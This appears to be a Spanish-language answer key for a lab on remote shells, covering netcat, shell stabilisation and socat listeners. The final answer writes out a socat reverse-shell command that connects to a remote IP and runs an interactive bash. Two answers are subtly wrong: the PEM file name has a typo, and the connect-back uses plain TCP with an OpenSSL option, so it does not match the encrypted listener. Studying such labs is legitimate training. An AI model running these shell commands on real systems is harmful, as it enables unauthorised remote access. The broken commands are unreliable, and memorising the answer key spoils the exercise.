## ¿Qué es una shell?

¿Qué tipo de shell se conecta de nuevo a un puerto de escucha en su computadora, Reverse (R) o Bind (B)?
 
    R

Ha inyectado código de shell malicioso en un sitio web. ¿Es probable que el caparazón que recibe sea interactivo? (S o N)
 
    N

Al usar un shell de enlace, ¿ejecutaría un oyente en el atacante (A) o el objetivo (T)?
 
    T

## Netcat

¿Qué opción le dice a netcat que escuche ?
 
    -l

¿Cómo se conectaría a un shell de enlace en la dirección IP: 10.10.10.11 con el puerto 8080?

    nc 10.10.10.11 8080

## Netcat Shell Stabilisation
¿Cómo cambiaría el tamaño de su terminal para tener 238 columnas?
 
    stty cols 238

¿Cuál es la sintaxis para configurar un servidor web Python3 en el puerto 80?
 
    sudo python3 -m http.server 80

## Socat

¿Cómo conseguiremos que socat escuche en el puerto TCP 8080?

    TCP-L:8080

## Socat Encrypted Shells 

¿Cuál es la sintaxis para configurar un OPENSSL-LISTENER usando la técnica tty de la tarea anterior? Utilice el puerto 
53 y un archivo PEM llamado "encrypt.pem"
 
    socat OPENSSL-LISTENER:53,cert=emcrypt.pem,verify=0 FILE:`tty`,raw,echo=0

Si su IP es 10.10.10.5, ¿qué sintaxis usaría para conectarse de nuevo a este oyente?

    socat TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane


